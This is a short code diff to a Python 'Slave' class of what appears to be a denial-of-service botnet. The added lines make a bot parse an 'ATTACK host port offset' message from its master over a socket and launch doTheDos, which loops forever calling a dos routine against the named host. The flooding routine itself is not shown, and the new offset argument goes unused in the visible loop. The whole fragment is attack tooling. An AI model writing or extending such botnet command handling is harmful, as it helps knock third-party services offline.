@@ -28,8 +28,11 @@ class Slave():
         msg_buf = self.sockMaster.recv(64)
         if len(msg_buf) > 0:
           print(msg_buf)
+          if (msg_buf.startswith('ATTACK')):
+              command, host, port, offset = msg_buf.split()
+              self.doTheDos(host, int(port), float(offset))
 
-    def doTheDos(self, host, port):
+    def doTheDos(self, host, port, offset):
         while 1:
             self.dos(host, port)
 
